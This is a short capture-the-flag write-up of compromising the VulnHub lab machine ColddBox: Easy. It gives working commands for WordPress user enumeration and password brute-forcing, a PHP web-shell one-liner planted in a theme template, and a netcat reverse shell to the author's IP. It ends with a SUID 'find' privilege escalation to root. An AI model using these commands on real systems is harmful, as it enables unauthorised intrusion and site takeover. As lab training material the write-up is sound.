# ColddBox: Easy

https://www.vulnhub.com/entry/colddbox-easy,586/

Just a warmup, as its been a while. Actually spent most of my time working on a new setup, using kali via WSL2. The biggest issue was catching a reverse shell, which because of how WSL2 works, seems to not be possible for now. Instead I used ncat for windows, via the nmap repo: https://nmap.org/download.html, but then had to fight a war with my own firewall to get it to catch something. Anyway!

1. Found the host only virtual box hosted vm via `nmap -sP 192.168.154.0/24` - that IP range being what I have configured for virtual box.
2. A scan of the machine revealed `80`, and a random port that turned out to be SSH.
3. On port `80` was a wordpress site. I ran `wp-scan` and got a list of users via `-e u`
4. Feeding these users and `rockyou.txt` back into `wp-scan` (`-U <list of users> -P <path to rockyou>`) I got a password within 0.16% of rockyou for the user `c0ldd`
5. Via this user/password, I logged into the admin portal and customised the `404.php` template with a one liner reverse shell: `<?php echo shell_exec($_GET['e'].' 2>&1'); ?>`
  - with this, accessing `?p=1337&e=ls` would list files, so I had rce. I found there was `/hidden` path this way, but it didn't matter by this point.
  - the user was `www-data`, as usual. while messing with my reverse shell shenanigans, I also established step 7 at this point.
6. Starting up `ncat.exe -nvlp 1337` on my windows machine, I caught a reverse shell via `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.154.1 1337 >/tmp/f`
7. A `find / -perm -u=s 2>/dev/null` revealed `/usr/bin/find` under the suid list.
8. Running `/usr/bin/find . -exec /bin/sh -p \; -quit` got me a root shell.

And that's all she wrote!
